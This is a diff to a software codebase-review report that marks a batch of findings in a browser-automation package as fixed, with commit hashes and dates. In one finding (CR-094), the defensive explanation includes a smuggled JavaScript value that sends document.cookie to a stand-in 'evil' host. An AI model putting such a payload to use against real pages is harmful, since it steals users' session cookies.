@@ -15,11 +15,11 @@ findings:
 verified: false
 status: issues_found
 dispositions:
-  fixed: 93
+  fixed: 106
   stale: 1
   skipped: 0
   deferred: 0
-  open: 13
+  open: 0
 ---
 
 # Codebase Review — moe
@@ -1740,6 +1740,10 @@ assigning to `url.hostname` (e.g. via `net.isIPv6(host) ? \`[${host}]\` : host`)
 or verify `url.hostname === useHost` after assignment and throw/return the
 original on mismatch.
 
+**Disposition:** fixed
+**Commit:** `86597b67fc828709b24ec9a7ad07bfbb3cd9ff7c`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-047: killChrome's port-based fallback SIGTERMs whatever now holds the port, unverified
 
 **File:** `packages/glass/skills/browsing/lib/chrome-process.js`
@@ -1765,6 +1769,10 @@ killing, verify the PID via `isPortAlive(host, port, pidToKill)` (which already
 takes an `expectedPid` for exactly this kind of check) and skip the kill (just
 clear state/meta) if it doesn't look like the Chrome we expect.
 
+**Disposition:** fixed
+**Commit:** `c4af3b3f97c647a67c8bd310ce1b3704a9b93970`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-048: Unescaped WebBluetooth/WebUSB device name injected into generated HTML artifact
 
 **File:** `packages/glass/skills/browsing/lib/dialogs-render.js`
@@ -1801,6 +1809,10 @@ opened/rendered. No other string in this file is escaped either (see the
 Fix: HTML-escape `d.id`/`d.name` (and any other page/device-controlled string)
 before interpolating into `htmlParts`.
 
+**Disposition:** fixed
+**Commit:** `37342c74150eb2cd675accd1d731a90e84cf21ce`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-049: html-diff safety cap still allows ~250MB single-call allocation, undercutting its own OOM mitigation
 
 **File:** `packages/glass/skills/browsing/lib/html-diff.js`
@@ -1829,6 +1841,10 @@ Memory grows quadratically with line count (500 lines -> 15.9MB, 1000 -> 61.5MB,
 
 Fix: either lower `MAX_DIFFABLE_LINES_PER_SIDE` substantially (e.g. to bound worst-case memory to single-digit MB), or replace the trace-snapshotting Myers implementation with a linear-space variant (Hirschberg-style divide-and-conquer) so the cap can stay generous without the quadratic memory cost.
 
+**Disposition:** fixed
+**Commit:** `4eb99bae9b4491ab3a9877d9637733612fd143bd`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-050: Session-boundary dialog-refusal test doesn't exercise the refusal it names
 
 **File:** `packages/glass/test/dialogs-wiring.test.mjs`
@@ -1870,6 +1886,10 @@ the real refusal, and only when a contributor has Chrome installed locally.
 Fix: replace the placebo assertions with the `stageAlertDialog` + wrapped
 session-method-call pattern already proven above.
 
+**Disposition:** fixed
+**Commit:** `d6850a38bbda0231cb00eb71e6ad8f92e8c6087f`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-051: Chrome 148+ incompatibility test is not skipped and will always fail
 
 **File:** `packages/glass/test/dialogs.smoke.test.mjs`
@@ -1891,6 +1911,10 @@ suite. Fix: mark the test `it.skip(...)` (or gate it behind a Chrome-version
 probe) with a pointer to the tracked incompatibility, so a genuine regression
 elsewhere in the suite isn't lost in expected noise.
 
+**Disposition:** fixed
+**Commit:** `050e8dd585a87211e1e0df2fb30b629fb919d991`
+**Resolved:** 2026-09-04
+**Note:** Verified via a new source-hygiene test (dialogs-smoke-hygiene.test.mjs) since no Chrome is installed in this environment to exercise dialogs.smoke.test.mjs directly.
 ### CR-052: test-harness.js cannot run at all: CommonJS `require()` inside an ES module
 
 **File:** `packages/glass/test/manual/test-harness.js`
@@ -1914,6 +1938,10 @@ field); `test-harness.js` alone kept the `.js` extension from the import and
 therefore hits both bugs. Fix: rename to `test-harness.cjs` (matching its
 siblings) in addition to fixing the relative require path.
 
+**Disposition:** fixed
+**Commit:** `b1ca215f8a0ddd1d75b25549cf0702f1b6fe0fdd`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-053: Manual Chrome test scripts require a relative path that only resolves from the package root, not from their own directory
 
 **File:** `packages/glass/test/manual/test-issue-18-pid.cjs`
@@ -1948,6 +1976,10 @@ adjusted for the new depth. None of this is caught by CI or `pnpm test` —
 silent. Fix: change each `./skills/browsing/...` reference to
 `../../skills/browsing/...`.
 
+**Disposition:** fixed
+**Commit:** `8ebf16df4a39d3d23aafdd9289e09fde504af517`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-054: jig plan seed silently drops topic words that coincide with the --entry value
 
 **File:** `packages/jig-graph/src/jig-extension.ts`
@@ -2908,6 +2940,10 @@ before building the attribute-selector string, or use
 `CSS.escape`-style handling / `querySelector` with an attribute value built
 via `element.getAttribute` comparison instead of string interpolation.
 
+**Disposition:** fixed
+**Commit:** `47647716c87069f699326bcde3606144c4fa248e`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-093: Two independently-maintained dialog-gate allowlists; one implementation is dead code
 
 **File:** `packages/glass/skills/browsing/lib/dialogs.js`
@@ -2920,6 +2956,10 @@ Meanwhile the actual, comprehensive dialog gate that protects every other page-t
 
 This is a maintenance/drift hazard rather than a live bug today: a future contributor adding a new page-target action would reasonably update `PAGE_TARGET_ACTIONS` (the more prominently documented set, with a full doc comment) believing that's sufficient to gate it, while the actual enforcement point they need to touch is `chrome-ws-lib.js`'s `PAGE_TARGET_SESSION_METHODS`. Any bug introduced in the dead `withDialogAwareness` function would also never be caught by any test that exercises real behavior. Recommend either wiring `withDialogAwareness` into an actual call site or deleting it and the unused portions of `PAGE_TARGET_ACTIONS`/`BROWSER_TARGET_ACTIONS`, and consolidating on the one set that chrome-ws-lib.js actually enforces.
 
+**Disposition:** fixed
+**Commit:** `d724e9ba1a6e11ff2f9af7773cbe19dc0ec56ee9`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-094: `selectOption`'s `index` parameter is interpolated into generated JS source unescaped
 
 **File:** `packages/glass/skills/browsing/lib/select-option.js`
@@ -2930,6 +2970,10 @@ This is a maintenance/drift hazard rather than a live bug today: a future contri
 
 I confirmed both current call sites — `capture.js`'s `selectOptionWithCapture` and the `chrome-ws` CLI's `select` command — always pass the literal default (`index` is never threaded through from any caller-controlled value today), so this is not presently reachable with untrusted input. But `attachSelectOption({ getPageSession })` is a publicly exported module whose documented signature accepts an `index`, and the multi-element-warning feature it exists for (JRV-129) is exactly the kind of feature a future caller would wire a user-supplied index into. If that ever happens without an intermediate validation layer, a value like `0]; fetch('https://evil/'+document.cookie); ({x:[0` would execute arbitrary JS in the page's `Runtime.evaluate` context. Recommend validating `Number.isInteger(index)` up front and embedding via `JSON.stringify(index)` for consistency and defense-in-depth, the same way `selector`/`values` already are.
 
+**Disposition:** fixed
+**Commit:** `c2108d4e7e8e1d281b6475be892f953e67f06f1b`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-095: `type` action has no way to avoid the ~80-160ms-per-character `humanType` path
 
 **File:** `packages/glass/src/index.ts`
@@ -2940,6 +2984,10 @@ The `type` action's handler unconditionally calls `chromeLib.humanType(tabIndex,
 
 Concretely: typing a 500-character value (a moderately long form field, a JSON blob, a paragraph of text — all ordinary uses of a browser-automation "type" action) takes on the order of 60 seconds with the documented defaults, with no override reachable through the MCP tool's schema or the HELP text (which just says `payload=literal text to type`). Any MCP host with a tool-call timeout shorter than that turns an entirely ordinary "type this text" request into a silent failure, and the codebase already contains the faster primitive (`fill`) that solves exactly this but is never wired into the exposed `type` action. Recommend forwarding `p.delay`/`p.jitter` (or a `p.fast` flag routing to `fill`) from the `type` payload into the underlying call.
 
+**Disposition:** fixed
+**Commit:** `04c08b8edd5327b751353a28ae907727d8695315`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-096: Temp directories from capture.test.mjs regression cases are never cleaned up
 
 **File:** `packages/glass/test/lib/capture.test.mjs`
@@ -2957,6 +3005,10 @@ but it is an unbounded leak across CI runs and repeated local `pnpm test`
 invocations. Fix: reuse the same `afterAll`-tracked cleanup pattern the outer
 block already has, or move `bug3Dir`/`bug4Dir` under the shared `tmpRoot`.
 
+**Disposition:** fixed
+**Commit:** `87eace5a5ded472ce89becdb63db6a485d9b5fef`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-097: `runSync` re-registers process-level signal/exit handlers on every call with no cleanup
 **File:** `packages/memory/src/sync-cli.ts`
 **Anchor:** `process.on("exit", releaseSyncLockOnce);`
